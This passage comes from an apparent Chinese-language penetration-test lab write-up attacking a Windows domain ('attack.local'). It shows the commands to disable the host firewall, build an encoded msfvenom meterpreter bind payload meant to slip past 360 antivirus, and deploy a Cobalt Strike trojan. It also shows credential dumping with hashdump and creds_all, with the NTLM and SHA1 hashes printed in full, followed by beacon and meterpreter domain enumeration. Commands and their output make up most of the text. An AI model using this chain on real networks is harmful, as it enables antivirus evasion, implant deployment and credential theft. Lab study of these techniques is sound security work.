<p>居然有360杀毒</p>
<h5 id="查看进行列表"><a class="markdownIt-Anchor" href="#查看进行列表"></a> 查看进行列表</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taslist</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/kVKoZ12lgcXeWmf.png" alt="image-20220127003229088" /></p>
<p>发现360杀毒、应该是由360全家桶的、但是一路上都没有对我们的webshell有查杀</p>
<h5 id="查看网卡信息-端口信息"><a class="markdownIt-Anchor" href="#查看网卡信息-端口信息"></a> 查看网卡信息、端口信息</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
<p><img src="C:/Users/joker/AppData/Roaming/Typora/typora-user-images/image-20220127220848487.png" alt="image-20220127220848487" /></p>
<p>这里445端口是开放的、如果可以利用的话、我们可以避免麻烦直接使用正向代理进行连接、这样就避免做二次代理的麻烦了。</p>
<p>ip</p>
<p><img src="https://s2.loli.net/2022/05/18/jL65gVxTYBoHROb.png" alt="image-20220127224433477" /></p>
<p>两张网卡、这次应该就是在域控了</p>
<h5 id="关闭windows防火墙"><a class="markdownIt-Anchor" href="#关闭windows防火墙"></a> 关闭Windows防火墙</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/LC1IkOQJhegFmcX.png" alt="image-20220127224813097" /></p>
<p>尝试访问445端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sudo nmap -sT -Pn 10.10.1.130 -p 445</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/9Pf6Eun3a8T24em.png" alt="image-20220127231620275" /></p>
<h3 id="制作正向连接代理"><a class="markdownIt-Anchor" href="#制作正向连接代理"></a> 制作正向连接代理</h3>
<h4 id="制作攻击载荷"><a class="markdownIt-Anchor" href="#制作攻击载荷"></a> 制作攻击载荷</h4>
<h5 id="使用msfvenom生成攻击载荷"><a class="markdownIt-Anchor" href="#使用msfvenom生成攻击载荷"></a> 使用msfvenom生成攻击载荷</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=6065 -e x86/shikata_ga_nai -i 40 -f c -o payload_bind40.c</span><br></pre></td></tr></table></figure>
<h6 id="使用掩目制作"><a class="markdownIt-Anchor" href="#使用掩目制作"></a> 使用掩目制作</h6>
<p><img src="https://s2.loli.net/2022/05/18/vys1IfLNqBFgmxw.png" alt="image-20220128114847726" /></p>
<h6 id="上传-4"><a class="markdownIt-Anchor" href="#上传-4"></a> 上传</h6>
<p><img src="https://s2.loli.net/2022/05/18/FIrhpN2Jj5aCRv6.png" alt="image-20220128115632631" /></p>
<p>并没有被查杀、难道360的版本是比较老的？</p>
<h5 id="制作cs木马"><a class="markdownIt-Anchor" href="#制作cs木马"></a> 制作CS木马</h5>
<p>那就在上传有一个cs的木马</p>
<p><img src="https://s2.loli.net/2022/05/18/nANZW7Tgz2vOSIo.png" alt="image-20220128115901290" /></p>
<p>无论怎么刷新都不会消失、尝试运行</p>
<h4 id="设置监听并上线"><a class="markdownIt-Anchor" href="#设置监听并上线"></a> 设置监听并上线</h4>
<h5 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set lhost 10.10.1.130     #正向连接的时候直接是设置目标机器的ip即可</span><br><span class="line">set lport 6065</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/7nI3iOmNZ8PedfX.png" alt="image-20220128121051872" /></p>
<h6 id="运行攻击载荷"><a class="markdownIt-Anchor" href="#运行攻击载荷"></a> 运行攻击载荷</h6>
<p><img src="https://s2.loli.net/2022/05/18/yMTNFcRLSWBVifq.png" alt="image-20220128121116671" /></p>
<h6 id="上线"><a class="markdownIt-Anchor" href="#上线"></a> 上线</h6>
<p><img src="https://s2.loli.net/2022/05/18/bS6MirUABl7e953.png" alt="image-20220128121143986" /></p>
<h5 id="cs"><a class="markdownIt-Anchor" href="#cs"></a> CS</h5>
<h6 id="设置监听器"><a class="markdownIt-Anchor" href="#设置监听器"></a> 设置监听器</h6>
<p><img src="https://s2.loli.net/2022/05/18/mhv762PBuAYd3cI.png" alt="image-20220128121217839" /></p>
<h6 id="执行木马"><a class="markdownIt-Anchor" href="#执行木马"></a> 执行木马</h6>
<p><img src="https://s2.loli.net/2022/05/18/pMER4AVFu5IXcz3.png" alt="image-20220128121243560" /></p>
<h6 id="上线-2"><a class="markdownIt-Anchor" href="#上线-2"></a> 上线</h6>
<p><img src="https://s2.loli.net/2022/05/18/ubL94axPXInqroW.png" alt="" /></p>
<p>我们使用CS不但上线了OA机器的system的会话、而且居然还能成功的将会话转入到ATTACK\Aadminiatrator的会话</p>
<h2 id="00x8-发现并进攻域控"><a class="markdownIt-Anchor" href="#00x8-发现并进攻域控"></a> 00x8-发现并进攻域控</h2>
<h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3>
<h4 id="密码收集"><a class="markdownIt-Anchor" href="#密码收集"></a> 密码收集</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">密码收集</span><br><span class="line">hashdump</span><br><span class="line">域控</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/dVrSFOKjlIbwihX.png" alt="image-20220128152812637" /></p>
<h4 id="发现域控"><a class="markdownIt-Anchor" href="#发现域控"></a> 发现域控</h4>
<h4 id="密码破解"><a class="markdownIt-Anchor" href="#密码破解"></a> 密码破解</h4>
<p><img src="https://s2.loli.net/2022/05/18/PGCRqTE1Ka5mJOe.png" alt="image-20220128153222242" /></p>
<p>OA</p>
<p><img src="https://s2.loli.net/2022/05/18/LpsADurVP7byX8T.png" alt="image-20220128153235988" /></p>
<p>密码暂时不管了</p>
<h4 id="继续域控"><a class="markdownIt-Anchor" href="#继续域控"></a> 继续域控</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 383765 (00000000:0005db15)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : OA</span><br><span class="line">Logon Server      : OA</span><br><span class="line">Logon Time        : 2022/1/27 22:14:41</span><br><span class="line">SID               : S-1-5-21-3252981389-920624007-1327000051-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00010000] CredentialKeys</span><br><span class="line">	 * NTLM     : 357bec0ee1f524c62ba536fcd3f74472</span><br><span class="line">	 * SHA1     : 43780ba4a0371ece954584ae098bcd820554bd54</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : OA</span><br><span class="line">	 * NTLM     : 357bec0ee1f524c62ba536fcd3f74472</span><br><span class="line">	 * SHA1     : 43780ba4a0371ece954584ae098bcd820554bd54</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : OA$</span><br><span class="line">Domain            : ATTACK</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/27 22:14:07</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">	msv :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 89278 (00000000:00015cbe)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/27 22:14:08</span><br><span class="line">SID               : S-1-5-90-1</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : OA$</span><br><span class="line">	 * Domain   : ATTACK</span><br><span class="line">	 * NTLM     : 65288d11ef4984198c4fe020137cd948</span><br><span class="line">	 * SHA1     : 5fbfecfb312235fe23a7be6c591e1e9c6ddbc3ff</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : OA$</span><br><span class="line">Domain            : ATTACK</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/27 22:14:07</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : OA$</span><br><span class="line">	 * Domain   : ATTACK</span><br><span class="line">	 * NTLM     : 65288d11ef4984198c4fe020137cd948</span><br><span class="line">	 * SHA1     : 5fbfecfb312235fe23a7be6c591e1e9c6ddbc3ff</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/27 22:14:08</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">	msv :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 50742 (00000000:0000c636)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/27 22:14:07</span><br><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : OA$</span><br><span class="line">	 * Domain   : ATTACK</span><br><span class="line">	 * NTLM     : 65288d11ef4984198c4fe020137cd948</span><br><span class="line">	 * SHA1     : 5fbfecfb312235fe23a7be6c591e1e9c6ddbc3ff</span><br></pre></td></tr></table></figure>
<h5 id="主机信息-2"><a class="markdownIt-Anchor" href="#主机信息-2"></a> 主机信息</h5>
<p><img src="https://s2.loli.net/2022/05/18/Mc6vfQtE8syPlHr.png" alt="image-20220128153444439" /></p>
<h4 id="定位域控"><a class="markdownIt-Anchor" href="#定位域控"></a> 定位域控</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net time</span><br><span class="line"></span><br><span class="line">假如是在域控的主机、就会返回域控的同步时间</span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/pyNeEQqvcJlBFCW.png" alt="image-20220128153750362" /></p>
<h5 id="域控-2"><a class="markdownIt-Anchor" href="#域控-2"></a> 域控</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dc.attack.local</span><br></pre></td></tr></table></figure>
<h5 id="查看域控的用户登录情况"><a class="markdownIt-Anchor" href="#查看域控的用户登录情况"></a> 查看域控的用户登录情况</h5>
<h6 id="使用cs"><a class="markdownIt-Anchor" href="#使用cs"></a> 使用CS</h6>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">net</span> domain                                      #域控的域名</span><br><span class="line">[*] Tasked beacon to run <span class="built_in">net</span> domain</span><br><span class="line">[+] host called home, sent: <span class="number">231</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">attack.local</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">beacon&gt; <span class="built_in">net</span> computers                                   #域控登录的主机信息（主机名、ip）</span><br><span class="line">[*] Tasked beacon to run <span class="built_in">net</span> computers</span><br><span class="line">[+] host called home, sent: <span class="number">87654</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"><span class="function">Computers:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Server</span> <span class="title">Name</span>             <span class="title">IP</span> <span class="title">Address</span>                      </span></span><br><span class="line"><span class="function"> -----------             ----------                      </span></span><br><span class="line"><span class="function"> <span class="title">DC</span>                      10.10.10.165</span></span><br><span class="line"><span class="function"> <span class="title">OA</span>                      10.10.1.130</span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">beacon</span>&gt; <span class="title">net</span> <span class="title">domain_controllers</span>                           #域控的主机名以及<span class="title">ip</span>信息</span></span><br><span class="line"><span class="function">[*] <span class="title">Tasked</span> <span class="title">beacon</span> <span class="title">to</span> <span class="title">run</span> <span class="title">net</span> <span class="title">domain_controllers</span></span></span><br><span class="line"><span class="function">[+] <span class="title">host</span> <span class="title">called</span> <span class="title">home</span>, <span class="title">sent</span>: 87663 <span class="title">bytes</span></span></span><br><span class="line"><span class="function">[+] <span class="title">received</span> <span class="title">output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Controllers</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Server</span> <span class="title">Name</span>             <span class="title">IP</span> <span class="title">Address</span>                      </span></span><br><span class="line"><span class="function"> -----------             ----------                      </span></span><br><span class="line"><span class="function"> <span class="title">DC</span>                      10.10.10.165</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"> <span class="title">beacon</span>&gt; <span class="title">net</span> <span class="title">domain_trusts</span>                             #域控信息、用户名</span></span><br><span class="line"><span class="function">[*] <span class="title">Tasked</span> <span class="title">beacon</span> <span class="title">to</span> <span class="title">run</span> <span class="title">net</span> <span class="title">domain_trusts</span></span></span><br><span class="line"><span class="function">[+] <span class="title">host</span> <span class="title">called</span> <span class="title">home</span>, <span class="title">sent</span>: 87658 <span class="title">bytes</span></span></span><br><span class="line"><span class="function">[+] <span class="title">received</span> <span class="title">output</span>:</span></span><br><span class="line"><span class="function"><span class="title">List</span> <span class="title">of</span> <span class="title">domain</span> <span class="title">trusts</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    0: <span class="title">ATTACK</span> <span class="title">attack.local</span> (<span class="title">Forest</span> <span class="title">tree</span> <span class="title">root</span>) (<span class="title">Primary</span> <span class="title">Domain</span>) (<span class="title">Native</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">beacon</span>&gt; <span class="title">net</span> <span class="title">logons</span>                                          #所有登录域的用户信息</span></span><br><span class="line"><span class="function">[*] <span class="title">Tasked</span> <span class="title">beacon</span> <span class="title">to</span> <span class="title">run</span> <span class="title">net</span> <span class="title">logons</span> <span class="title">on</span> <span class="title">localhost</span></span></span><br><span class="line"><span class="function">[+] <span class="title">host</span> <span class="title">called</span> <span class="title">home</span>, <span class="title">sent</span>: 87651 <span class="title">bytes</span></span></span><br><span class="line"><span class="function">[+] <span class="title">received</span> <span class="title">output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Logged</span> <span class="title">on</span> <span class="title">users</span> <span class="title">at</span> \\<span class="title">localhost</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">OA</span>\<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">ATTACK</span>\<span class="title">OA</span>$</span></span><br><span class="line"><span class="function"><span class="title">ATTACK</span>\<span class="title">OA</span>$</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">beacon</span>&gt; <span class="title">net</span> <span class="title">sessions</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Tasked</span> <span class="title">beacon</span> <span class="title">to</span> <span class="title">run</span> <span class="title">net</span> <span class="title">sessions</span> <span class="title">on</span> <span class="title">localhost</span></span></span><br><span class="line"><span class="function">[+] <span class="title">host</span> <span class="title">called</span> <span class="title">home</span>, <span class="title">sent</span>: 87653 <span class="title">bytes</span></span></span><br><span class="line"><span class="function">[+] <span class="title">received</span> <span class="title">output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Sessions</span> <span class="title">for</span> \\<span class="title">localhost</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Computer</span>               <span class="title">User</span> <span class="title">name</span>            <span class="title">Active</span> (<span class="title">s</span>)     <span class="title">Idle</span> (<span class="title">s</span>)</span></span><br><span class="line"><span class="function"> --------               ---------            ----------     --------</span></span><br><span class="line"><span class="function"> \\[::1]                <span class="title">OA</span>$                  5              0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">beacon</span>&gt; <span class="title">net</span> <span class="title">share</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Tasked</span> <span class="title">beacon</span> <span class="title">to</span> <span class="title">run</span> <span class="title">net</span> <span class="title">share</span> <span class="title">on</span> <span class="title">localhost</span></span></span><br><span class="line"><span class="function">[+] <span class="title">host</span> <span class="title">called</span> <span class="title">home</span>, <span class="title">sent</span>: 87650 <span class="title">bytes</span></span></span><br><span class="line"><span class="function">[+] <span class="title">received</span> <span class="title">output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Shares</span> <span class="title">at</span> \\<span class="title">localhost</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Share</span> <span class="title">name</span>                       <span class="title">Comment</span></span></span><br><span class="line"><span class="function"> ----------                       -------</span></span><br><span class="line"><span class="function"> <span class="title">ADMIN</span>$                           远程管理</span></span><br><span class="line"><span class="function"> <span class="title">C</span>$                               默认共享</span></span><br><span class="line"><span class="function"> <span class="title">IPC</span>$                             远程 <span class="title">IPC</span></span></span><br></pre></td></tr></table></figure>
<h6 id="使用msf"><a class="markdownIt-Anchor" href="#使用msf"></a> 使用MSF</h6>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_logged_on_users       #所有登陆域的用户信息</span><br><span class="line"></span><br><span class="line">[*] Running against session <span class="number">4</span></span><br><span class="line"></span><br><span class="line">Current Logged Users</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line"> SID                                           User</span><br><span class="line"> ---                                           ----</span><br><span class="line"> S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">18</span>                                      NT AUTHORITY\SYSTEM</span><br><span class="line"> S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3252981389</span>-<span class="number">920624007</span>-<span class="number">1327000051</span>-<span class="number">500</span>  OA\Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results saved <span class="keyword">in</span>: /home/kali/.msf4/loot/<span class="number">20220130040913</span>_moonlab1.<span class="number">114</span>_10.<span class="number">10</span>.<span class="number">1</span>.<span class="number">130</span>_host.users.activ_385207.txt</span><br><span class="line"></span><br><span class="line">Recently Logged Users</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line"> SID                                           Profile <span class="built_in">Path</span></span><br><span class="line"> ---                                           ------------</span><br><span class="line"> S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">18</span>                                      <span class="variable">%systemroot%</span>\system32\config\systemprofile</span><br><span class="line"> S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">19</span>                                      C:\Windows\ServiceProfiles\LocalService</span><br><span class="line"> S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">20</span>                                      C:\Windows\ServiceProfiles\NetworkService</span><br><span class="line"> S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3252981389</span>-<span class="number">920624007</span>-<span class="number">1327000051</span>-<span class="number">500</span>  C:\Users\Administrator</span><br><span class="line"> S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">4052809752</span>-<span class="number">717748265</span>-<span class="number">227546684</span>-<span class="number">1103</span>  C:\Users\oa</span><br><span class="line"> S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">4052809752</span>-<span class="number">717748265</span>-<span class="number">227546684</span>-<span class="number">500</span>   C:\Users\administrator.ATTACK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_ad_computers      #域内用户的主机信息</span><br><span class="line"></span><br><span class="line">Domain Computers</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"> dNSHostName      distinguishedName                               description  operatingSystem                  operatingSystemServicePack</span><br><span class="line"> -----------      -----------------                               -----------  ---------------                  --------------------------</span><br><span class="line"> dc.attack.local  CN=DC,OU=Domain Controllers,DC=attack,DC=local               Windows Server <span class="number">2016</span> Standard</span><br><span class="line"> oa.attack.local  CN=OA,CN=Computers,DC=attack,DC=local                        Windows Server <span class="number">2012</span> R2 Standard</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_domain    #域控的名字和dc所在的ip</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: attack</span><br><span class="line">[+] FOUND Domain Controller: dc (IP: <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">165</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="使用shell"><a class="markdownIt-Anchor" href="#使用shell"></a> 使用shell</h6>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">myoa</span>\<span class="title">nginx</span>&gt;<span class="title">net</span> <span class="title">user</span> /<span class="title">domain</span>                           #查看域内用户</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">user</span> /<span class="title">domain</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">request</span> <span class="title">will</span> <span class="title">be</span> <span class="title">processed</span> <span class="title">at</span> <span class="title">a</span> <span class="title">domain</span> <span class="title">controller</span> <span class="title">for</span> <span class="title">domain</span> <span class="title">attack.local</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">User</span> <span 